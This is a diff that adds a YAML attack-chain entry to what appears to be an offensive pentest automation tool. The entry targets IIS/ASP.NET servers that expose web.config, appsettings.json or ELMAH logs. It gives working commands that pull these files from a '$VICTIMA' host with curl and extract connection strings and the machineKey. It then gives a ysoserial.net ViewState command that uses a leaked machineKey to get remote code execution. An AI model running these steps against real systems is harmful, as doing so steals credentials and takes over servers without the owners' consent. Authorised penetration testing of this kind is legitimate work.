@@ -1,0 +1,42 @@
+chain_id: iis_web_config_exposed
+title: "IIS — web.config / .NET app secrets disclosure"
+severity: HIGH
+tags: [web, iis, dotnet, config-disclosure]
+
+trigger:
+  any_of:
+    - { path_pattern: "(?i)/(web\\.config|appsettings\\.json|app_offline\\.htm|elmah\\.axd)$" }
+    - { path_in: ["/web.config", "/appsettings.json", "/elmah.axd"] }
+
+description: |
+  ASP.NET applications occasionally leak their web.config (DB connection
+  strings, machineKey for ViewState forging) or appsettings.json. ELMAH
+  (`/elmah.axd`) often runs without auth and exposes full request/response
+  histories with cookies and tokens.
+
+steps:
+  - id: 1
+    title: "Pull the canonical files"
+    command: |
+      curl -s http://$VICTIMA/web.config
+      curl -s http://$VICTIMA/appsettings.json
+      curl -s http://$VICTIMA/elmah.axd
+      curl -s http://$VICTIMA/elmah.axd/download
+
+  - id: 2
+    title: "Triage"
+    command: |
+      curl -s http://$VICTIMA/web.config -o web.config
+      rootctl extract web.config
+      # connectionStrings → fires dsn_url_credentials
+      # machineKey       → use to forge ViewState (next step)
+
+  - id: 3
+    title: "If machineKey was leaked — forge ViewState for ASP.NET RCE"
+    command: |
+      python3 ysoserial.net.py -p ViewState -g TextFormattingRunProperties \
+        -c 'whoami' --validationkey=<HEX> --validationalg=SHA1 \
+        --decryptionkey=<HEX> --decryptionalg=AES
+
+references:
+  - https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-knowing-the-secret
